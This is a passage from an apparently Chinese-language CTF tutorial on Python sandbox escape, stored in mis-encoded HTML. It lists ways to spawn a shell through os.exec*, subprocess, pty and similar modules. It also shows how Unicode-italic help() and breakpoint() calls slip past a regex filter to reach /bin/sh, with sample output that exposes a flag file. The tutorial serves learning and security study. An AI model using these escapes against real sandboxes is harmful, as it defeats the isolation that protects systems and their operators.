<td>âŒ</td>
</tr>
<tr>
<td><code>execvp</code></td>
<td>ç¨‹åºå</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âŒ</td>
<td>âœ…</td>
</tr>
<tr>
<td><code>execvpe</code></td>
<td>ç¨‹åºå</td>
<td>åˆ—è¡¨å‚æ•°</td>
<td>âœ…</td>
<td>âœ…</td>
</tr>
</tbody></table>
<p>ä¾‹å­ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                      <span class="comment"># æœ€ç®€å• exec</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], os.environ)       <span class="comment"># åˆ—è¡¨ + ç¯å¢ƒ</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                           <span class="comment"># æœç´¢ PATH</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure></div>

<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>è¿›ç¨‹æ›¿æ¢ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼ˆå½“å‰ Python è¿›ç¨‹ç»ˆæ­¢ï¼‰ã€‚</li>
<li>é€‚åˆææƒåç›´æ¥åˆ‡ shellã€‚</li>
</ul>
<h4 id="fork-å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰"><a href="#fork-å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰" class="headerlink" title="fork + å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰"></a><code>fork</code> + å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰</h4><p>æ‰‹åŠ¨ fork å‡ºä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).fork() == <span class="number">0</span>) <span class="keyword">and</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>çˆ¶è¿›ç¨‹ç»§ç»­è¿è¡Œï¼Œå­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</li>
<li>å¸¸é…åˆ exec ç³»åˆ—å®ç°å¹¶è¡Œã€‚</li>
</ul>
<h3 id="subprocess-æ¨¡å—"><a href="#subprocess-æ¨¡å—" class="headerlink" title="subprocess æ¨¡å—"></a>subprocess æ¨¡å—</h3><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>Python ç‰ˆæœ¬</th>
<th>è¿”å›å€¼ç±»å‹ &#x2F; å†…å®¹</th>
<th>å¤±è´¥å¤„ç†</th>
<th>è·å–è¾“å‡ºæ–¹å¼</th>
<th>æ˜¯å¦èµ° shell</th>
</tr>
</thead>
<tbody><tr>
<td><code>Popen</code></td>
<td>py2 &#x2F; py3</td>
<td><code>Popen</code> å¯¹è±¡</td>
<td>æ— </td>
<td>âŒï¼ˆéœ€ <code>stdout=PIPE</code> å <code>.stdout.read()</code>ï¼‰</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>call</code></td>
<td>py2 &#x2F; py3</td>
<td><code>int</code>ï¼ˆexit codeï¼‰</td>
<td>æ— </td>
<td>âŒ</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>check_call</code></td>
<td>py2 &#x2F; py3</td>
<td><code>int</code>ï¼ˆexit codeï¼‰</td>
<td>é”™è¯¯æŠ›å¼‚å¸¸</td>
<td>âŒ</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>check_output</code></td>
<td>py2 &#x2F; py3</td>
<td><code>bytes</code>ï¼ˆå‘½ä»¤è¾“å‡ºï¼‰</td>
<td>é”™è¯¯æŠ›å¼‚å¸¸</td>
<td>âœ…ï¼ˆç›´æ¥è¿”å› stdoutï¼‰</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>run</code></td>
<td>py3</td>
<td><code>CompletedProcess</code> å¯¹è±¡</td>
<td>å¯é€‰æŠ›å¼‚å¸¸</td>
<td>âœ…ï¼ˆéœ€ <code>capture_output=True</code> æˆ– <code>stdout=PIPE</code>ï¼‰</td>
<td>é»˜è®¤å¦ï¼Œå¯é€‰</td>
</tr>
<tr>
<td><code>getoutput</code></td>
<td>py3</td>
<td><code>str</code>ï¼ˆå‘½ä»¤è¾“å‡ºï¼‰</td>
<td>æ— </td>
<td>âœ…ï¼ˆç›´æ¥è¿”å› stdoutï¼‰</td>
<td><strong>æ€»æ˜¯ shell&#x3D;True</strong></td>
</tr>
<tr>
<td><code>getstatusoutput</code></td>
<td>py3</td>
<td><code>(int, str)</code></td>
<td>æ— </td>
<td>âœ…ï¼ˆè¿”å› exit code å’Œ stdoutï¼‰</td>
<td><strong>æ€»æ˜¯ shell&#x3D;True</strong></td>
</tr>
</tbody></table>
<h4 id="Popen-ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰"><a href="#Popen-ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰" class="headerlink" title="Popen ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰"></a><code>Popen</code> ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰</h4><p>ç›´æ¥å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œå¯ä»¥é…ç½® <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> ç®¡é“ã€æ˜¯å¦ç”¨ shellã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen(args, bufsize=-<span class="number">1</span>, executable=<span class="literal">None</span>,</span><br><span class="line">                 stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>,</span><br><span class="line">                 shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, env=<span class="literal">None</span>, ...)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>args</code>ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆå­—ç¬¦ä¸²æˆ–åˆ—è¡¨ï¼‰</li>
<li><code>stdout</code> &#x2F; <code>stderr</code> &#x2F; <code>stdin</code>ï¼šæ§åˆ¶æ ‡å‡†æµï¼ˆé»˜è®¤ç»§æ‰¿çˆ¶è¿›ç¨‹ï¼‰</li>
<li><code>shell</code>ï¼šæ˜¯å¦é€šè¿‡ shell æ‰§è¡Œï¼ˆ<code>/bin/sh</code> æˆ– <code>cmd.exe</code>ï¼‰</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># æ‰§è¡Œå‘½ä»¤å¹¶è¯»å–è¾“å‡º</span></span><br><span class="line">subprocess.Popen(</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>,                     <span class="comment"># argsï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆå› ä¸º shell=Trueï¼Œæ‰€ä»¥æ˜¯å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">    shell=<span class="literal">True</span>,               <span class="comment"># é€šè¿‡ shell è¿è¡Œï¼ˆLinux é»˜è®¤ /bin/shï¼‰</span></span><br><span class="line">    stdout=subprocess.PIPE,   <span class="comment"># æŠŠå­è¿›ç¨‹çš„ stdout é‡å®šå‘åˆ°ç®¡é“</span></span><br><span class="line">    stderr=subprocess.STDOUT  <span class="comment"># æŠŠ stderr åˆå¹¶åˆ° stdout</span></span><br><span class="line">).stdout.read()               <span class="comment"># ä» stdout ç®¡é“ä¸­ä¸€æ¬¡æ€§è¯»å–å…¨éƒ¨å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ²™ç®±ç»•è¿‡ï¼šåŠ¨æ€å¯¼å…¥</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€-è¾“å‡º"><a href="#é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€-è¾“å‡º" class="headerlink" title="é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€&#x2F;è¾“å‡º"></a>é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€&#x2F;è¾“å‡º</h4><p>è°ƒç”¨åä¼šç­‰å¤–éƒ¨å‘½ä»¤æ‰§è¡Œç»“æŸå†è¿”å›ï¼ˆé™¤éè¶…æ—¶æˆ–è¢«ä¿¡å·ä¸­æ–­ï¼‰</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># è¿”å› exit code</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># exit code !=0 æŠ›å¼‚å¸¸</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># è¿”å›è¾“å‡ºï¼ˆstrï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)           <span class="comment"># è¿”å› CompletedProcess å¯¹è±¡</span></span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)                 <span class="comment"># è¿”å›è¾“å‡ºï¼ˆç®€åŒ–ç‰ˆï¼‰</span></span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)           <span class="comment"># è¿”å› (exit_code, output)</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># åŒ py2</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># åŒ py2</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># åŒ py2</span></span><br></pre></td></tr></table></figure></div>

<h3 id="timeit-æ¨¡å—"><a href="#timeit-æ¨¡å—" class="headerlink" title="timeit æ¨¡å—"></a>timeit æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="platform-æ¨¡å—"><a href="#platform-æ¨¡å—" class="headerlink" title="platform æ¨¡å—"></a>platform æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="pty-æ¨¡å—"><a href="#pty-æ¨¡å—" class="headerlink" title="pty æ¨¡å—"></a>pty æ¨¡å—</h3><p>ä»…é™ Linux ç¯å¢ƒ</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="åé—¨å‘½ä»¤"><a href="#åé—¨å‘½ä»¤" class="headerlink" title="åé—¨å‘½ä»¤"></a>åé—¨å‘½ä»¤</h3><h4 id="help-å‡½æ•°"><a href="#help-å‡½æ•°" class="headerlink" title="help å‡½æ•°"></a>help å‡½æ•°</h4><p>ä»¥ä¸‹é¢çš„ç¯å¢ƒä¸ºä¾‹</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div>

<p>å½“æˆ‘ä»¬è¾“å…¥ <code>help</code> æ—¶ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ˜©ğ˜¦ğ˜­ğ˜±()</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ä½ è¾“å…¥ ASCII çš„ <code>help()</code> ä¼šè¢«æ­£åˆ™å¹²æ‰ï¼›ä½†ç”¨äº† <strong>æ•°å­¦æ–œä½“å­—æ¯</strong> <code>ğ˜©ğ˜¦ğ˜­ğ˜±()</code>ï¼ˆé ASCIIï¼‰ï¼Œé…åˆ <strong>PEP 3131 çš„ NFKC è§„èŒƒåŒ–</strong>ï¼Œæ ‡è¯†ç¬¦ä¼šè¢«å½’ä¸€åŒ–ä¸º <code>help()</code>ï¼Œäºæ˜¯æˆåŠŸè°ƒç”¨åˆ° <code>builtins.help</code>ã€‚</p>

    </div>
  </div>

<p>ç„¶åè¾“å…¥ <code>os</code>ï¼Œæ­¤æ—¶ä¼šè¿›å…¥ <code>os</code> çš„å¸®åŠ©æ–‡æ¡£ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨è¾“å…¥ <code>!sh</code> å°±å¯ä»¥æ‹¿åˆ° <code>/bin/sh</code>, è¾“å…¥ <code>!bash</code> åˆ™å¯ä»¥æ‹¿åˆ° <code>/bin/bash</code>ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></div>

<h4 id="breakpoint-å‡½æ•°"><a href="#breakpoint-å‡½æ•°" class="headerlink" title="breakpoint å‡½æ•°"></a>breakpoint å‡½æ•°</h4><p><code>breakpoint</code> æ˜¯ä» Python <strong>3.7</strong> å¼€å§‹å¼•å…¥çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ã€‚é»˜è®¤è¡Œä¸ºï¼šè°ƒç”¨ <code>sys.breakpointhook()</code> â†’ å¯åŠ¨ <code>pdb.set_trace()</code>ï¼Œä¹Ÿå°±æ˜¯è¿›å…¥ <strong>Pdb</strong>ï¼ˆPython è°ƒè¯•å™¨ï¼‰ã€‚</p>
<p>åœ¨ Pdb æç¤ºç¬¦ <code>(Pdb)</code> é‡Œï¼Œä½ å¯ä»¥æŸ¥çœ‹å˜é‡ã€æ‰§è¡Œè¡¨è¾¾å¼ï¼Œç”šè‡³è¿è¡Œä»»æ„ Python è¯­å¥ã€‚åœ¨è¾“å…¥ <code>breakpoint()</code> åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ğ˜£ğ˜³ğ˜¦ğ˜¢ğ˜¬ğ˜±ğ˜°ğ˜ªğ˜¯ğ˜µ()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure></div>

<h1 id="å¸¸è§æ²™ç®±"><a href="#å¸¸è§æ²™ç®±" class="headerlink" title="å¸¸è§æ²™ç®±"></a>å¸¸è§æ²™ç®±</h1><h1 id="Python-ç¨‹åºç»“æ„"><a href="#Python-ç¨‹åºç»“æ„" class="headerlink" title="Python ç¨‹åºç»“æ„"></a>Python ç¨‹åºç»“æ„</h1><h2 id="æ¨¡å—ï¼ˆModuleï¼‰"><a href="#æ¨¡å—ï¼ˆModuleï¼‰" class="headerlink" title="æ¨¡å—ï¼ˆModuleï¼‰"></a>æ¨¡å—ï¼ˆModuleï¼‰</h2><p>åœ¨ Python ä¸­<strong>æ¨¡å—ï¼ˆModuleï¼‰</strong>å°±æ˜¯ä¸€ä¸ª <code>.py</code> æ–‡ä»¶ã€‚å½“ä½  <code>import</code> å®ƒæ—¶ï¼ŒPython ä¼š<strong>å…ˆè¿è¡Œä¸€æ¬¡</strong>è¿™ä¸ªæ–‡ä»¶é‡Œçš„ä»£ç ï¼Œç„¶åæŠŠè¿è¡Œç»“æœæ‰“åŒ…æˆä¸€ä¸ª<strong>æ¨¡å—å¯¹è±¡</strong>ã€‚è¿™ä¸ªæ¨¡å—å¯¹è±¡é‡Œä¿å­˜äº†ä½ åœ¨æ–‡ä»¶é‡Œå®šä¹‰çš„å˜é‡ã€å‡½æ•°å’Œç±»ï¼Œè¿™ä¸ªä¿å­˜ç©ºé—´å°±æ˜¯å®ƒçš„<strong>å‘½åç©ºé—´</strong>ï¼ˆå…¶å®å°±æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé”®æ˜¯åå­—ï¼Œå€¼æ˜¯å¯¹è±¡ï¼‰ã€‚</p>
<p>Python ä¼šæŠŠè¿™ä¸ªæ¨¡å—å¯¹è±¡<strong>å­˜åˆ°ä¸€ä¸ªå…¨å±€å­—å…¸ <code>sys.modules</code> é‡Œ</strong>ï¼Œä¸‹æ¬¡ä½ å†å¯¼å…¥åŒåæ¨¡å—ï¼Œå°±ç›´æ¥ä»è¿™ä¸ªå­—å…¸é‡Œæ‹¿ç°æˆçš„ï¼Œä¸ä¼šå†è¿è¡Œä¸€æ¬¡æ–‡ä»¶é‡Œçš„ä»£ç ã€‚</p>
<h2 id="åŒ…ï¼ˆPackageï¼‰"><a href="#åŒ…ï¼ˆPackageï¼‰" class="headerlink" title="åŒ…ï¼ˆPackageï¼‰"></a>åŒ…ï¼ˆPackageï¼‰</h2><p><strong>åŒ…ï¼ˆPackageï¼‰</strong>æ˜¯åŒ…å« <code>__init__.py</code> æ–‡ä»¶çš„ç›®å½•ï¼Œç”¨äºå°†å¤šä¸ªæ¨¡å—æŒ‰å±‚æ¬¡ç»“æ„ç»„ç»‡èµ·æ¥ã€‚åŒ…çš„ä½œç”¨æ˜¯<strong>æŠŠå¤šä¸ªæ¨¡å—æŒ‰å±‚æ¬¡ç»“æ„ç»„ç»‡èµ·æ¥</strong>ï¼Œå°±åƒæ–‡ä»¶å¤¹ç®¡ç†æ–‡ä»¶ä¸€æ ·ã€‚</p>
<p>æŠ€æœ¯ä¸Šï¼Œ<strong>åŒ…ä¹Ÿæ˜¯ <code>&lt;class &#39;module&#39;&gt;</code> å¯¹è±¡</strong>ã€‚åŒ…å’Œæ¨¡å—å”¯ä¸€åŒºåˆ«æ˜¯ï¼šæ™®é€šæ¨¡å—æ¥æºæ˜¯ä¸€ä¸ª <code>.py</code> æ–‡ä»¶ï¼›åŒ…æ¥æºæ˜¯ä¸€ä¸ª **ç›®å½• + <code>__init__.py</code>**ã€‚</p>
<p>å¦å¤–åŒ…é‡Œé¢æ—¢å¯ä»¥åŒ…å«<strong>æ¨¡å—</strong>è¿˜å¯ä»¥åŒ…å«<strong>å…¶ä»–çš„åŒ…</strong>ã€‚åœ¨åŒ…å¯¹åº”çš„ç›®å½•ä¸‹ï¼š</p>
<ul>
<li><p><code>.py</code> æ–‡ä»¶ â†’ å­æ¨¡å—</p>
</li>
<li><p>ç›®å½•ï¼ˆå« <code>__init__.py</code>ï¼‰â†’ å­åŒ…</p>
</li>
</ul>
<p>å¯¼å…¥æ—¶ï¼Œè¿™äº›å­æ¨¡å— &#x2F; å­åŒ…ä¼šè¢«åŠ è½½ä¸ºæ¨¡å—å¯¹è±¡ï¼Œå¹¶<strong>æ”¾è¿›æ‰€åœ¨åŒ…çš„å‘½åç©ºé—´é‡Œ</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mypkg.subpkg.mod</span><br></pre></td></tr></table></figure></div>

<p>ä¼šè®©ï¼š</p>
<ul>
<li><code>mypkg.__dict__[&#39;subpkg&#39;]</code> ä¿å­˜ <code>&lt;module &#39;mypkg.subpkg&#39;&gt;</code></li>
<li><code>mypkg.subpkg.__dict__[&#39;mod&#39;]</code> ä¿å­˜ <code>&lt;module &#39;mypkg.subpkg.mod&#39;&gt;</code></li>
</ul>
<h2 id="å‘½åç©ºé—´ï¼ˆNamespaceï¼‰"><a href="#å‘½åç©ºé—´ï¼ˆNamespaceï¼‰" class="headerlink" title="å‘½åç©ºé—´ï¼ˆNamespaceï¼‰"></a>å‘½åç©ºé—´ï¼ˆNamespaceï¼‰</h2><p><strong>å‘½åç©ºé—´ï¼ˆNamespaceï¼‰</strong>å°±æ˜¯<strong>åå­—åˆ°å¯¹è±¡çš„æ˜ å°„å…³ç³»</strong>ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œç”¨æ¥å­˜æ”¾â€œæŸä¸ªåå­—å½“å‰æŒ‡å‘å“ªä¸ªå¯¹è±¡â€çš„ä¿¡æ¯ã€‚</p>
<p>Python ä¸­å‡ ä¹æ‰€æœ‰ä¸œè¥¿ï¼ˆå˜é‡ã€å‡½æ•°ã€ç±»ã€æ¨¡å—ã€åŒ…ï¼‰éƒ½æ˜¯å¯¹è±¡ï¼Œå‘½åç©ºé—´å°±æ˜¯è¿™äº›åå­—çš„å­˜æ”¾ä½ç½®ã€‚</p>
<p>å¸¸è§çš„å‡ ç±»å‘½åç©ºé—´ï¼š</p>
<ul>
<li><strong>å±€éƒ¨å‘½åç©ºé—´ï¼ˆLocalï¼‰</strong>ï¼šå‡½æ•°æˆ–æ–¹æ³•å†…éƒ¨å®šä¹‰çš„åå­—ï¼ˆå‚æ•°ã€å±€éƒ¨å˜é‡ç­‰ï¼‰ã€‚</li>
<li><strong>é—­åŒ…å‘½åç©ºé—´ï¼ˆEnclosingï¼‰</strong>ï¼šåµŒå¥—å‡½æ•°çš„å¤–å±‚å‡½æ•°ä½œç”¨åŸŸã€‚</li>
<li><strong>å…¨å±€å‘½åç©ºé—´ï¼ˆGlobalï¼‰</strong>ï¼šä¸€ä¸ªæ¨¡å—æ–‡ä»¶é¡¶å±‚å®šä¹‰çš„åå­—ï¼ˆæ¨¡å—çº§å˜é‡ã€å‡½æ•°ã€ç±»ç­‰ï¼‰ã€‚</li>
<li><strong>å†…ç½®å‘½åç©ºé—´ï¼ˆBuiltinsï¼‰</strong>ï¼šPython å¯åŠ¨æ—¶åŠ è½½çš„å†…ç½®åå­—ï¼ˆ<code>len</code>ã€<code>print</code>ã€<code>Exception</code> ç­‰ï¼‰ã€‚</li>
</ul>
<p>å˜é‡æŸ¥æ‰¾éµå¾ª <strong>LEGB</strong>ï¼ˆ <strong>L</strong>ocal â†’ <strong>E</strong>nclosing â†’ <strong>G</strong>lobal â†’ <strong>B</strong>uiltinsï¼‰ é¡ºåºï¼Œæ‰¾ä¸åˆ°å°±æŠ› <code>NameError</code>ï¼Œ<strong>ä¿è¯äº†ä¸åŒä½œç”¨åŸŸçš„å˜é‡äº’ä¸å†²çª</strong>ã€‚</p>
<p>åœ¨ Python ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>globals()</code> å’Œ <code>locals()</code> å‡½æ•°åˆ†åˆ«è·å–<strong>å½“å‰æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</strong>å’Œ<strong>å½“å‰ä½œç”¨åŸŸçš„å±€éƒ¨å‘½åç©ºé—´</strong>ï¼Œå¦å¤–æ¨¡å—çš„ <code>__dict__</code> å±æ€§è¡¨ç¤ºçš„æ˜¯æ¨¡å—çš„å‘½åç©ºé—´ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())      <span class="comment"># å½“å‰æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>())       <span class="comment"># å½“å‰ä½œç”¨åŸŸçš„å±€éƒ¨å‘½åç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(math.__dict__)  <span class="comment"># math æ¨¡å—çš„å‘½åç©ºé—´</span></span><br></pre></td></tr></table></figure></div>

<h1 id="builtins-æ¨¡å—"><a href="#builtins-æ¨¡å—" class="headerlink" title="builtins æ¨¡å—"></a>builtins æ¨¡å—</h1><h2 id="ä»€ä¹ˆæ˜¯-builtinsï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-builtinsï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ builtinsï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ builtinsï¼Ÿ</h2><p>åœ¨ Python ä¸­ï¼Œæœ‰ä¸€ç»„åŠŸèƒ½æ˜¯<strong>é»˜è®¤å°±å¯ä»¥ç”¨çš„</strong>ï¼Œæ¯”å¦‚ï¼š</p>
